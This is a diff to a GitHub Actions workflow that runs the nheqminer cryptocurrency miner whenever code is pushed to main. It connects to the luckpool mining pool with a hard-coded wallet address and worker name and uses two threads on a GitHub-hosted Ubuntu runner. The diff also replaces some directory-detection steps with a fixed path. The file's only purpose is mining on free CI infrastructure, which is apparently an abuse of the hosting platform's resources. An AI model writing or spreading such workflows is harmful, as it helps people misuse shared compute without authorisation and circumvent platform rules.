@@ -1,16 +1,16 @@
-name: Run Nheqminer
+name: Run nheqminer
 
 on:
   push:
     branches:
-      - main  # Change this to the branch you want to trigger the workflow on
+      - main  # Adjust this to your target branch
 
 jobs:
-  build:
+  run-nheqminer:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout code
+      - name: Checkout repository
         uses: actions/checkout@v2
 
       - name: Install wget and tar
@@ -23,26 +23,10 @@ jobs:
       - name: Extract nheqminer
         run: |
           tar -xvf nheqminer-Linux-v0.8.2.tgz
-
-      - name: List extracted files
-        run: |
-          ls -l  # List files in the current directory
-
-      - name: Identify nheqminer directory
-        id: identify
-        run: |
-          for dir in nheqminer*; do
-            if [ -d "$dir" ]; then
-              echo "Found directory: $dir"
-              echo "::set-output name=dir::$dir"
-            fi
-          done
-
-      - name: List files in nheqminer directory
-        run: |
-          ls -l ${{ steps.identify.outputs.dir }}  # List files in the identified directory
+          # If there's also a tar.gz file, you may want to extract that as well
+          # tar -xvf nheqminer-Linux-v0.8.2.tar.gz
 
       - name: Run nheqminer
         run: |
-          cd ${{ steps.identify.outputs.dir }}  # Change to the identified directory
+          cd nheqminer
           ./nheqminer -v -l na.luckpool.net:3956 -u RP8SNudJuHRv3GJsxb2LJBrKxQKRdKoHL3.kiukiu1 -p x -t 2
